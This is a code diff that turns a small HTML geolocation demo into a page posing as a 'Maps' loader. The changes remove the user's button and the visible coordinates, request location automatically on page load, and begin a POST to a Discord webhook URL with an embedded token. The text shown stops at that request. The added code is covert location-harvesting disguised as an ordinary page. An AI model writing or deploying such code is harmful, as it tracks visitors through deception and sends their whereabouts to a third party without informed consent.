@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
 <body>
-<h1>HTML Geolocation</h1>
-<p>Click the button to get your coordinates.</p>
+<h1>Maps/h1>
+<h3>Maps are loading waiting for location acsess.</h3>
 
-<button onclick="getLocation()">Try It</button>
+
 
 <p id="demo"></p>
 
@@ -12,7 +12,7 @@
 
 
   
-const x = document.getElementById("demo");
+getLocation();
 
 function getLocation() {
   if (navigator.geolocation) {
@@ -23,8 +23,7 @@ function getLocation() {
 }
 
 function showPosition(position) {
-  x.innerHTML = "Latitude: " + position.coords.latitude + 
-  "<br>Longitude: " + position.coords.longitude;
+
 
         var xhr = new XMLHttpRequest();
         xhr.open("POST", "https://discord.com/api/webhooks/1255297754901647444/Oi0N8DLQ1ibD0Bjx4_eqWQLUevi_S5wZFPQ08Wenwzry7jPN6b4EjlmnN8gspTN2q0JJ", true);
